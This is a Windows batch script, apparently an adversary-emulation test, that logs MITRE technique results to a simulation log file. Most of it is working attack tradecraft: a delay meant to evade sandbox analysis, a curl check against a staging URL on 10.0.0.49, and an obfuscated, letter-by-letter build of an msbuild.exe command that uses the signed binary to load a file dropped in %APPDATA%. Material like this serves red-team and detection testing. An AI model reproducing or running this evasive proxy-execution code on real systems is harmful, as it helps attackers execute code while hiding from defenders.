@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NEVER encoded)
SET txisnba=%APPDATA%\7843\34c06474
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7843-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=exploren.txt
SET dvhhyc=7843

REM Random variables for computed values
SET akjdh=%rrocubc%
SET qwzxc=%dvhhyc%
SET logpath=%APPDATA%\%akjdh%\macula-simulations.log

REM Initial delay to evade sandbox analysis
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: delay_start=initial_60s>>> "!logpath!" 2>nul
timeout /t 60 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: delay_complete=initial_60s>>> "!logpath!" 2>nul

REM Check server availability
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: heartbeat_check_start=!keghkgto!>>> "!logpath!" 2>nul
curl -k -s -o nul "!keghkgto!"
SET hb_result=!ERRORLEVEL!
IF !hb_result! NEQ 0 (
    SET result=0
    SET err_detail=connection_failed
    echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: heartbeat_check_failed=!hb_result!>>> "!logpath!" 2>nul
) ELSE (
    SET result=1
    SET err_detail=
    echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: heartbeat_check_success>>> "!logpath!" 2>nul
)

REM TTP logging for heartbeat check
echo [!DATE! !TIME!][%jwcnifl%]: !akjdh!-!qwzxc!-T1105|Ingress Tool Transfer=!result!:!err_detail!>>> "!logpath!" 2>nul

REM Delay between operations
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: delay_start=ping_10s>>> "!logpath!" 2>nul
ping -n 10 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: delay_complete=ping_10s>>> "!logpath!" 2>nul

REM Build msbuild.exe using character-by-character obfuscation
SET c1=m
SET c2=s
SET c3=b
SET c4=u
SET c5=i
SET c6=l
SET c7=d
SET c8=.
SET c9=e
SET c10=x
SET c11=e
SET lolbin=%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%%c9%%c10%%c11%

REM Build command parts with obfuscation
SET p1=/
SET p2=l
SET p3=o
SET p4=g
SET p5=g
SET p6=e
SET p7=r
SET p8=:
SET p9=L
SET p10=o
SET p11=g
SET p12=g
SET p13=e
SET p14=r
SET p15=E
SET p16=n
SET p17=t
SET p18=r
SET p19=y
SET p20=,
SET param_prefix=%p1%%p2%%p3%%p4%%p5%%p6%%p7%%p8%%p9%%p10%%p11%%p12%%p13%%p14%%p15%%p16%%p17%%p18%%p19%%p20%

SET a1=;
SET a2=M
SET a3=y
SET a4=P
SET a5=a
SET a6=r
SET a7=a
SET a8=m
SET a9=e
SET a10=t
SET a11=e
SET a12=r
SET a13=s
SET a14=,
SET a15=F
SET a16=o
SET a17=o
SET arg_suffix=%a1%%a2%%a3%%a4%%a5%%a6%%a7%%a8%%a9%%a10%%a11%%a12%%a13%%a14%%a15%%a16%%a17%

REM Construct full command
SET full_cmd=%lolbin% %param_prefix%!txisnba!\!xzanpex!%arg_suffix%

REM Random delay before execution
SET /A rdelay=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: delay_start=random_!rdelay!s>>> "!logpath!" 2>nul
timeout /t !rdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: delay_complete=random_!rdelay!s>>> "!logpath!" 2>nul

REM Execute the command
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: process_start=!full_cmd!>>> "!logpath!" 2>nul
%full_cmd%
SET exec_result=!ERRORLEVEL!

REM Log execution result
IF !exec_result! NEQ 0 (
    SET ttp_result=0
    SET ttp_err=execution_failed
    echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: process_failed=!exec_result!>>> "!logpath!" 2>nul
) ELSE (
    SET ttp_result=1
    SET ttp_err=
    echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: process_success>>> "!logpath!" 2>nul
)

REM TTP logging for T1218 execution
echo [!DATE! !TIME!][%jwcnifl%]: !akjdh!-!qwzxc!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_err!>>> "!logpath!" 2>nul

REM Final delay before exit
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: delay_start=choice_15s>>> "!logpath!" 2>nul
CHOICE /C Y /N /D Y /T 15 >nul
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: delay_complete=choice_15s>>> "!logpath!" 2>nul

echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: script_complete>>> "!logpath!" 2>nul